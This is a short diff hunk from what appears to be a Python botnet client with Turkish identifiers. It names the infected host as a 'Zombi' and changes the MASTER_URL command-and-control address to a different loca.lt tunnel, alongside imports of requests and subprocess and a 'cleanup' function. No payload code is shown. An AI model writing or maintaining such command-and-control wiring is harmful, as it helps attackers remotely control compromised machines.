@@ -5,7 +5,7 @@ import requests
 import subprocess
 
 # --- AYARLAR ---
-MASTER_URL = "https://social-words-allow.loca.lt" 
+MASTER_URL = "https://ordu-komutan-3.loca.lt" 
 ZOMBI_AD = f"Zombi-{os.uname()[1]}"
 
 def temizlik_yap():
